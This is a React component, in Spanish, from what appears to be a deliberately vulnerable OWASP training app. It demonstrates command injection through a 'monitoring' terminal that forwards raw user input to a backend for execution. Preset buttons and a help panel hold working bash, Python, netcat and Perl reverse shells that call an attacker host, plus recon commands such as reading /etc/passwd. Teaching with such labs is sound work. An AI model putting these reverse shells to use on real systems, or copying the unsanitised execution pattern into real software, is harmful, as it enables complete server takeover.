import React, { useState } from 'react';

const CommandInjection: React.FC = () => {
    const [command, setCommand] = useState('');
    const [output, setOutput] = useState('');
    const [isExecuting, setIsExecuting] = useState(false);

    const executeCommand = async () => {
        setIsExecuting(true);
        
        // VULNERABILIDAD CRÍTICA: Ejecución directa de comandos del sistema
        // Enviar comando al backend para ejecución real
        
        try {
            const response = await fetch('/api/execute-command', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ command: command }),
            });

            const data = await response.json();
            
            if (data.success) {
                setOutput(`✅ COMANDO EJECUTADO EXITOSAMENTE:\n$ ${command}\n\n${data.output}`);
            } else if (data.error) {
                setOutput(`❌ ERROR EN EJECUCIÓN:\n$ ${command}\n\nError: ${data.error}`);
            } else {
                setOutput(`⚠️ RESPUESTA INESPERADA:\n$ ${command}\n\n${JSON.stringify(data, null, 2)}`);
            }
        } catch (error) {
            // Si no hay backend, mostrar simulación
            console.log('Backend no disponible, usando simulación');
            setTimeout(() => {
                // Código de simulación existente como fallback
                let simulatedOutput = '';
                const cmd = command.toLowerCase();
                
                if (cmd.includes('ls') || cmd.includes('dir')) {
                    simulatedOutput = `total 48
drwxr-xr-x 12 www-data www-data 4096 Sep 27 10:30 .
drwxr-xr-x  3 root     root     4096 Sep 20 14:15 ..
-rw-r--r--  1 www-data www-data  220 Sep 20 14:15 .bash_logout
-rw-r--r--  1 www-data www-data 3771 Sep 20 14:15 .bashrc
-rw-r--r--  1 www-data www-data  807 Sep 20 14:15 .profile
drwxr-xr-x  8 www-data www-data 4096 Sep 27 10:25 aplicaci-n-web-vulnerable-owasp-top-10
-rw-r--r--  1 www-data www-data 1337 Sep 27 09:15 passwords.txt
-rw-------  1 www-data www-data 2048 Sep 27 08:30 private_key.pem`;
                } else if (cmd.includes('whoami')) {
                    simulatedOutput = 'www-data';
                } else if (cmd.includes('nc') || cmd.includes('netcat')) {
                    simulatedOutput = '🚨 REVERSE SHELL SIMULADA 🚨\n[Backend no disponible - Solo simulación]\n[+] En un entorno real, esto establecería conexión con el atacante';
                } else {
                    simulatedOutput = `� SIMULACIÓN (Backend no disponible)\n$ ${command}\n[Salida simulada - Para ejecución real, usar el backend Node.js]`;
                }
                
                setOutput(simulatedOutput);
            }, 500);
        }
        setIsExecuting(false);
    };    const predefinedCommands = [
        { label: '📁 Listar archivos', cmd: 'ls -la', danger: 'low' },
        { label: '👤 Usuario actual', cmd: 'whoami', danger: 'low' },
        { label: '🆔 Info usuario', cmd: 'id', danger: 'low' },
        { label: '💻 Info sistema', cmd: 'uname -a', danger: 'medium' },
        { label: '👥 Ver usuarios', cmd: 'cat /etc/passwd', danger: 'high' },
        { label: '🌐 Conexiones red', cmd: 'netstat -tulpn', danger: 'high' },
        { label: '⚡ Procesos activos', cmd: 'ps aux', danger: 'high' },
        { label: '🚨 Bash Reverse Shell', cmd: 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1', danger: 'critical' },
        { label: '� Python Reverse Shell', cmd: 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\'', danger: 'critical' },
        { label: '🔧 Netcat sin -e', cmd: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.1.100 4444 >/tmp/f', danger: 'critical' },
        { label: '💀 Perl Reverse Shell', cmd: 'perl -e \'use Socket;$i="192.168.1.100";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");}\'', danger: 'critical' }
    ];

    const getDangerColor = (danger: string) => {
        switch (danger) {
            case 'low': return 'bg-green-600 hover:bg-green-700';
            case 'medium': return 'bg-yellow-600 hover:bg-yellow-700';
            case 'high': return 'bg-orange-600 hover:bg-orange-700';
            case 'critical': return 'bg-red-600 hover:bg-red-700 animate-pulse';
            default: return 'bg-gray-600 hover:bg-gray-700';
        }
    };

    return (
        <div>
            <h2 className="text-2xl font-bold text-accent mb-2">💀 Command Injection - Sistema de Monitoreo</h2>
            <p className="text-text-secondary mb-6">
                Escenario: La aplicación permite ejecutar comandos del sistema para "monitoreo", 
                pero no valida ni sanitiza la entrada del usuario, permitiendo ejecución arbitraria de comandos.
            </p>

            <div className="bg-primary p-6 rounded-lg shadow-lg border border-border-color">
                <div className="mb-4 p-4 rounded-lg bg-red-900/50 border border-red-500 text-red-300">
                    <p><strong className="font-bold">⚠️ PELIGRO EXTREMO:</strong> Esta funcionalidad permite ejecución directa de comandos del sistema.</p>
                    <p><strong>Impacto:</strong> Control total del servidor, robo de datos, reverse shells, escalación de privilegios.</p>
                </div>

                <h3 className="text-xl font-bold mb-4">🖥️ Terminal de Monitoreo del Sistema</h3>
                
                <div className="mb-4">
                    <label htmlFor="command" className="block mb-2 font-bold">Comando a ejecutar:</label>
                    <input 
                        id="command"
                        type="text" 
                        value={command}
                        onChange={(e) => setCommand(e.target.value)}
                        placeholder="Ingresa el comando del sistema..."
                        className="w-full bg-secondary p-3 rounded border border-border-color focus:outline-none focus:ring-2 focus:ring-accent font-mono"
                        onKeyPress={(e) => e.key === 'Enter' && executeCommand()}
                    />
                </div>

                <div className="mb-4">
                    <p className="text-sm text-gray-400 mb-2">Comandos de ejemplo:</p>
                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-2">
                        {predefinedCommands.map((item, index) => (
                            <button
                                key={index}
                                onClick={() => setCommand(item.cmd)}
                                className={`text-xs px-3 py-2 rounded text-white transition-all ${getDangerColor(item.danger)}`}
                                title={`Peligrosidad: ${item.danger.toUpperCase()}`}
                            >
                                {item.label}
                            </button>
                        ))}
                    </div>
                </div>

                <button 
                    onClick={executeCommand}
                    disabled={isExecuting || !command.trim()}
                    className="w-full bg-red-600 hover:bg-red-700 disabled:bg-gray-600 text-white font-bold py-3 px-4 rounded transition-colors mb-4"
                >
                    {isExecuting ? '🔄 Ejecutando...' : '💀 EJECUTAR COMANDO'}
                </button>

                {output && (
                    <div className="p-4 bg-black rounded border border-green-500">
                        <h4 className="font-bold mb-2 text-green-400">$ Salida del comando:</h4>
                        <pre className="text-green-300 font-mono text-sm whitespace-pre-wrap overflow-x-auto">
                            {output}
                        </pre>
                    </div>
                )}

                <div className="mt-6 p-4 bg-gray-800 rounded border border-gray-600">
                    <h4 className="font-bold mb-2 text-red-300">🚨 Reverse Shells que FUNCIONAN en Ubuntu:</h4>
                    <div className="text-sm space-y-2">
                        <div className="p-2 bg-gray-900 rounded">
                            <p className="text-yellow-300 font-semibold">🔥 Bash Reverse Shell (RECOMENDADO):</p>
                            <code className="text-green-300 font-mono text-xs block">
                                bash -i &gt;&amp; /dev/tcp/ATACANTE_IP/4444 0&gt;&amp;1
                            </code>
                        </div>
                        <div className="p-2 bg-gray-900 rounded">
                            <p className="text-yellow-300 font-semibold">🐍 Python3 Reverse Shell:</p>
                            <code className="text-green-300 font-mono text-xs block">
                                python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATACANTE_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
                            </code>
                        </div>
                        <div className="p-2 bg-gray-900 rounded">
                            <p className="text-yellow-300 font-semibold">🔧 Netcat sin -e (Ubuntu compatible):</p>
                            <code className="text-green-300 font-mono text-xs block">
                                rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc ATACANTE_IP 4444 &gt;/tmp/f
                            </code>
                        </div>
                        <div className="p-2 bg-gray-900 rounded">
                            <p className="text-yellow-300 font-semibold">💎 Perl Reverse Shell:</p>
                            <code className="text-green-300 font-mono text-xs block">
                                perl -e 'use Socket;$i="ATACANTE_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){"{"} open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");{"}"}'
                            </code>
                        </div>
                        <div className="p-2 bg-orange-900 rounded border border-orange-500">
                            <p className="text-orange-300 font-semibold">⚠️ NOTA IMPORTANTE:</p>
                            <p className="text-orange-200 text-xs">En Ubuntu, netcat no incluye -e por defecto. Usa las alternativas de arriba.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default CommandInjection;